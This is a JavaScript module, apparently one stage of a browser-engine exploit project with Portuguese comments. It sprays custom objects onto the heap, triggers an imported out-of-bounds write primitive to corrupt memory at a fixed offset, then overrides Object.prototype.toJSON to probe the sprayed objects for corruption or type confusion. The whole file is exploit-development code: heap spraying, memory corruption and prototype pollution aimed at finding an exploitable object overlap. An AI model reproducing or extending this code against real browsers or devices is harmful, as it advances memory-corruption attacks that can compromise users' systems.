// js/script3/testSprayComplexObjects.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs';

class MyComplexObject {
    constructor(id) {
        this.id = `MyObj-${id}`;
        this.value1 = 12345; // Um número
        this.value2 = "initial_state"; // Uma string
        this.marker = 0xCAFECAFE; // Um marcador para verificar se a estrutura foi sobrescrita
    }

    checkIntegrity(loggerFunc = null) {
        let checkOk = true;
        const currentId = this.id || "ID_DESCONHECIDO";
        if (this.marker !== 0xCAFECAFE) {
            if(loggerFunc) loggerFunc(`!! ${currentId} - FALHA INTEGRIDADE! Marcador: ${toHex(this.marker)} (esperado 0xCAFECAFE)`, 'critical', 'checkIntegrity');
            checkOk = false;
        }
        if (this.value1 !== 12345) {
            if(loggerFunc) loggerFunc(`!! ${currentId} - FALHA INTEGRIDADE! value1: ${this.value1} (esperado 12345)`, 'critical', 'checkIntegrity');
            checkOk = false;
        }
        if (this.value2 !== "initial_state") {
            if(loggerFunc) loggerFunc(`!! ${currentId} - FALHA INTEGRIDADE! value2: "${this.value2}" (esperado "initial_state")`, 'critical', 'checkIntegrity');
            checkOk = false;
        }
        return checkOk;
    }

    action() {
        // Ação simples para ver se o objeto ainda é funcional e pode retornar algo
        return `ID:${this.id}_Val1:${this.value1}_Marker:${toHex(this.marker)}`;
    }
}

// toJSON que sonda propriedades específicas de MyComplexObject
// Esta função foi validada como estável no seu último log bem-sucedido
export function toJSON_ProbeMyComplexObjectSpecific() {
    const FNAME_toJSON = "toJSON_ProbeMyComplexObjectSpecific";
    let result_payload = {
        toJSON_executed: FNAME_toJSON,
        this_type: Object.prototype.toString.call(this),
        is_instance_of_mycomplexobject: false,
        id_prop: "N/A",
        value1_prop: "N/A",
        value2_prop: "N/A",
        marker_prop: "N/A",
        integrity_check_result: "N/A",
        action_method_result: "N/A",
        error_in_toJSON: null
    };

    try {
        result_payload.is_instance_of_mycomplexobject = this instanceof MyComplexObject;

        if (result_payload.is_instance_of_mycomplexobject) {
            // Acessar propriedades diretamente
            try { result_payload.id_prop = String(this.id).substring(0,50); }
            catch (e) { result_payload.id_prop = `Error: ${e.name}`; }

            try { result_payload.value1_prop = this.value1; }
            catch (e) { result_payload.value1_prop = `Error: ${e.name}`; }

            try { result_payload.value2_prop = String(this.value2).substring(0,50); }
            catch (e) { result_payload.value2_prop = `Error: ${e.name}`; }

            try { result_payload.marker_prop = toHex(this.marker); }
            catch (e) { result_payload.marker_prop = `Error: ${e.name}`; }

            // Tentar chamar métodos
            try {
                // Passar null como logger para checkIntegrity para evitar logs duplicados ou complexidade aqui
                result_payload.integrity_check_result = this.checkIntegrity(null);
            } catch (e) {
                result_payload.integrity_check_result = `Error calling checkIntegrity: ${e.name}`;
            }
            try {
                result_payload.action_method_result = String(this.action()).substring(0,100);
            } catch (e) {
                result_payload.action_method_result = `Error calling action: ${e.name}`;
            }
        } else {
            result_payload.error_in_toJSON = "this is not an instance of MyComplexObject.";
        }

    } catch (e_main) {
        result_payload.error_in_toJSON = (result_payload.error_in_toJSON || "") + ` GEN_ERR: ${e_main.name}: ${e_main.message}`;
    }
    return result_payload;
}

// Modificada para aceitar o valor e o tamanho da corrupção
export async function executeSprayAndProbeWithValue(value_to_write_in_oob_ab, bytes_to_write_oob_val, corruption_value_desc) {
    const FNAME_TEST = `executeSprayAndProbeWithValue<${corruption_value_desc}>`;
    logS3(`--- Iniciando Teste Spray & Probe: Corrupção com ${corruption_value_desc} (${isAdvancedInt64Object(value_to_write_in_oob_ab) ? value_to_write_in_oob_ab.toString(true) : toHex(value_to_write_in_oob_ab, bytes_to_write_oob_val * 8)}) ---`, "test", FNAME_TEST);
    document.title = `Spray & Probe - CorruptVal: ${corruption_value_desc}`;

    const spray_count = 50; // Reduzido para acelerar, aumente para 200-500 se os resultados forem inconclusivos
    const sprayed_objects = [];
    const corruption_offset_in_oob_ab = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70

    logS3(`1. Pulverizando ${spray_count} instâncias de MyComplexObject...`, "info", FNAME_TEST);
    try {
        for (let i = 0; i < spray_count; i++) {
            sprayed_objects.push(new MyComplexObject(i));
        }
        logS3(`   Pulverização de ${sprayed_objects.length} objetos concluída.`, "good", FNAME_TEST);
    } catch (e_spray) {
        logS3(`ERRO durante a pulverização: ${e_spray.message}. Abortando.`, "error", FNAME_TEST);
        return { sprayError: e_spray, corruptionValueDesc: corruption_value_desc };
    }

    await PAUSE_S3(MEDIUM_PAUSE_S3);

    logS3(`2. Configurando ambiente OOB e realizando escrita OOB em oob_array_buffer_real[${toHex(corruption_offset_in_oob_ab)}]...`, "info", FNAME_TEST);
    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup. Abortando.", "error", FNAME_TEST);
        return { oobError: new Error("OOB Setup Failed"), corruptionValueDesc: corruption_value_desc };
    }

    try {
        oob_write_absolute(corruption_offset_in_oob_ab, value_to_write_in_oob_ab, bytes_to_write_oob_val);
        logS3(`   Escrita OOB de ${isAdvancedInt64Object(value_to_write_in_oob_ab) ? value_to_write_in_oob_ab.toString(true) : toHex(value_to_write_in_oob_ab)} em oob_array_buffer_real[${toHex(corruption_offset_in_oob_ab)}] (${bytes_to_write_oob_val} bytes) realizada.`, "info", FNAME_TEST);
    } catch (e_write) {
        logS3(`   ERRO na escrita OOB: ${e_write.message}. Abortando sondagem.`, "error", FNAME_TEST);
        clearOOBEnvironment();
        return { oobWriteError: e_write, corruptionValueDesc: corruption_value_desc };
    }

    await PAUSE_S3(MEDIUM_PAUSE_S3);

    logS3(`3. Sondando ${sprayed_objects.length} objetos complexos pulverizados com toJSON_ProbeMyComplexObjectSpecific...`, "test", FNAME_TEST);

    const ppKey_val = 'toJSON';
    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
    let pollutionApplied = false;
    let firstProblematicObjectResult = null;

    try {
        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSON_ProbeMyComplexObjectSpecific,
            writable: true, configurable: true, enumerable: false
        });
        pollutionApplied = true;

        const objectsToProbe = Math.min(sprayed_objects.length, 10); // Sondar os primeiros 10 para rapidez
        logS3(`   Sondando os primeiros ${objectsToProbe} objetos...`, 'info', FNAME_TEST);

        for (let i = 0; i < objectsToProbe; i++) {
            const obj = sprayed_objects[i];
            if (!obj) continue;

            document.title = `Sondando Obj ${i} - CorruptVal: ${corruption_value_desc}`;
            let stringifyResult = null;
            let errorDuringStringify = null;

            logS3(`   Testando objeto ${i} (ID: ${obj.id})...`, 'info', FNAME_TEST);
            try {
                stringifyResult = JSON.stringify(obj);
                logS3(`     JSON.stringify(obj[${i}]) completou. Resultado da toJSON: ${JSON.stringify(stringifyResult)}`, "info", FNAME_TEST); //

                if (stringifyResult && stringifyResult.error_in_toJSON) {
                    errorDuringStringify = new Error(`Erro interno da toJSON: ${stringifyResult.error_in_toJSON}`);
                } else if (stringifyResult && stringifyResult.integrity_check_result === false) {
                    errorDuringStringify = new Error(`Falha de integridade detectada pela toJSON.`);
                } else if (stringifyResult && stringifyResult.action_method_result && String(stringifyResult.action_method_result).startsWith("Error")) {
                    errorDuringStringify = new Error(`Erro ao chamar método action: ${stringifyResult.action_method_result}`);
                } else if (stringifyResult && stringifyResult.is_instance_of_mycomplexobject === false && stringifyResult.this_type !== "[object Null]" && stringifyResult.this_type !== "[object Undefined]") {
                    errorDuringStringify = new Error(`Type confusion! 'this' não é MyComplexObject, mas ${stringifyResult.this_type}`);
                }

            } catch (e_str) {
                errorDuringStringify = e_str;
                logS3(`     !!!! ERRO AO STRINGIFY obj[${i}] !!!!: ${e_str.name} - ${e_str.message}`, "critical", FNAME_TEST);
            }

            if (errorDuringStringify) {
                firstProblematicObjectResult = {
                    index: i,
                    id: obj.id || "ID_DESCONHECIDO",
                    error: {name: errorDuringStringify.name, message: errorDuringStringify.message},
                    toJSONReturn: stringifyResult,
                    corruptionValueDesc: corruption_value_desc
                };
                document.title = `PROBLEM ComplexObj @ ${i}! (${errorDuringStringify.name}) Val: ${corruption_value_desc}`;
                break; // Parar no primeiro problema encontrado
            }
            await PAUSE_S3(SHORT_PAUSE_S3); // Pausa entre objetos
        }
    } catch (e_main_loop) {
        logS3(`Erro no loop principal de sondagem: ${e_main_loop.message}`, "error", FNAME_TEST);
        firstProblematicObjectResult = { error: {name: "MainLoopError", message: e_main_loop.message }, corruptionValueDesc: corruption_value_desc};
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONDescriptor);
            else delete Object.prototype[ppKey_val];
        }
    }

    if (firstProblematicObjectResult) {
        logS3(`PROBLEMA DETECTADO com corrupção ${corruption_value_desc}: Objeto index ${firstProblematicObjectResult.index} (ID: ${firstProblematicObjectResult.id})`, "critical", FNAME_TEST);
        logS3(`  Detalhes do problema: ${JSON.stringify(firstProblematicObjectResult.error)}`, "critical", FNAME_TEST);
        logS3(`  Retorno da toJSON (se houver): ${JSON.stringify(firstProblematicObjectResult.toJSONReturn)}`, "info", FNAME_TEST);
    } else {
        logS3(`Nenhum problema óbvio (crash/erro/falha de integridade) detectado nos primeiros objetos sondados com corrupção ${corruption_value_desc}.`, "good", FNAME_TEST);
    }

    logS3(`--- Teste Spray & Probe com corrupção ${corruption_value_desc} CONCLUÍDO ---`, "test", FNAME_TEST);
    clearOOBEnvironment();
    sprayed_objects.length = 0;
    globalThis.gc?.(); // Sugere coleta de lixo, se disponível
    return firstProblematicObjectResult;
}
